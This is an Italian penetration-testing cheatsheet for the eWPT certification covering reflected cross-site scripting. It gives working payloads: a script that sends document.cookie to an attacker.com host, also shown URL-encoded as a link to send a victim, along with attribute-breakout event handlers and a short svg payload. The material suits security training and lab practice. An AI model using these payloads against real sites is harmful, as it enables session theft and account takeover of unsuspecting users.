---
layout: cheatsheet
cert: ewpt
cert_label: "eWPT"
title: "Reflected XSS"
permalink: "/cheatsheet/ewpt/05-cross-site-scripting/02-reflected-xss/"
section: "Cross-Site Scripting"
section_order: 5
order: 2
sort_key: 502
---

**Difficoltà:** Intermediate
**Time to Master:** 1.5h
**Prerequisiti:** [01-XSS-Fundamentals.md](/cheatsheet/ewpt/05-cross-site-scripting/01-xss-fundamentals/)
**Lab:** PortSwigger Academy, Reflected XSS

---

## Obiettivo

È la forma più semplice di XSS da capire, ed è anche quella che ti farà scoprire subito il vincolo più fastidioso del reflected: il payload non basta trovarlo, devi anche convincere qualcuno a cliccarlo. Qui vedi come sfruttare parametri riflessi immediatamente nella response (query string, form) per costruire un link malevolo che esegue JS nel browser della vittima al click.

---

## Concetti chiave

### Vettore d'attacco tipico

```
http://target.com/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

La vittima deve cliccare il link (social engineering, email, messaggio); l'esecuzione avviene nel contesto/sessione della vittima, non dell'attaccante.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Burp Repeater | test parametro per parametro | conferma riflessione | manuale |
| Browser | apertura link diretta | esecuzione reale | verifica finale |

---

## Payload / Esempi

### Esempio 1: reflected XSS su parametro di ricerca

```
http://target.com/search?q=<script>alert(document.domain)</script>
```

**Output atteso:** popup con il dominio del target: conferma che il payload esegue nel contesto dell'origine corretta.

### Esempio 2: reflected XSS in attributo HTML

Se l'input finisce in `<input value="INPUT">`:
```
" onfocus="alert(1)" autofocus="
" onmouseover="alert(1)
```

**Spiegazione:** chiudi l'attributo con `"` e aggiungi un event handler; `autofocus` forza l'esecuzione senza bisogno di interazione utente.

### Esempio 3: costruire il link completo per invio alla vittima

```
http://target.com/search?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fc%3F%27%2Bdocument.cookie%3C%2Fscript%3E
```

**Spiegazione:** URL-encoda sempre il payload completo prima di inviarlo come link, altrimenti caratteri speciali possono rompere l'URL stesso o essere interpretati male dal client email/chat.

---

## Evasion / Bypass Techniques

Vedi [06-WAF-Evasion.md](/cheatsheet/ewpt/05-cross-site-scripting/06-waf-evasion/). Nota specifica per reflected: se l'app riflette il payload ma lo tronca a X caratteri, usa payload corti tipo `<svg/onload=alert(1)>` invece di script lunghi.

---

## Lab Hands-On

### Lab 1: PortSwigger, Reflected XSS into attribute with angle brackets HTML-encoded
**Obiettivo:** bypassare encoding parziale e ottenere esecuzione
**Difficulty:** Medio
**Time:** 30 min

**Walkthrough breve:**
1. Osserva che `<`/`>` sono encodati ma le quote no
2. Chiudi l'attributo con `"` e usa event handler
3. Conferma esecuzione

---

## Common Mistakes

- Testare solo nel browser senza controllare il sorgente -> l'encoding parziale (solo `<>` ma non `"`) lo noti solo guardando l'HTML generato, non l'output visivo della pagina
- Dimenticare l'URL-encoding quando condividi il link PoC -> ti si rompe il link proprio nel momento in cui deve funzionare, o viene alterato dal client di destinazione

---

## Link Utili

- [PortSwigger: Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)

---

## Connessioni

- **Prerequisito:** [01-XSS-Fundamentals.md](/cheatsheet/ewpt/05-cross-site-scripting/01-xss-fundamentals/)
- **Prossimo Step:** [03-Stored-XSS.md](/cheatsheet/ewpt/05-cross-site-scripting/03-stored-xss/)

---

## Checklist di padronanza

- [ ] So costruire un PoC reflected XSS completo (link cliccabile)
- [ ] So adattare il payload al contesto (HTML body vs attributo)
- [ ] So URL-encodare correttamente il link finale
